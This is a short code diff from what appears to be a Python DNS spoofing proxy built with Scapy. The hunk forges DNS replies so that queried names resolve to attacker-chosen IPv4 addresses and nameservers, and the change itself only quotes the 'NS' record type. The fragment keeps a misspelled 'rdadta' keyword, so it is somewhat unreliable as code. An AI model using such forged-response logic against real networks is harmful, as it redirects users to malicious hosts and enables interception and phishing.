@@ -50,7 +50,7 @@ def handler(data, addr, socket, dns_ip):
                     UDP(dport=original_dns_packet[UDP].dport, sport=original_dns_packet[UDP].sport) /\
                     DNS(id=original_dns_packet[DNS].id, qr=1, aa=1, qd=original_dns_packet[DNS].qd,
                     an=DNSRR(rrname=original_dns_packet[DNS].qd.qname, ttl=original_dns_packet[DNS].an.ttl,rdata=to_be_spoofed[url]['ipv4']),
-                    ns=DNSRR(rrname=original_dns_packet[DNS].qd.qname, ttl=84107, type=NS, rdadta=to_be_spoofed[url]['ns']))
+                    ns=DNSRR(rrname=original_dns_packet[DNS].qd.qname, ttl=84107, type='NS', rdadta=to_be_spoofed[url]['ns']))
                 print "Spoofed packet", spoofed_dns_packet.show()
                 proxy_response = str(spoofed_dns_packet)
             else:
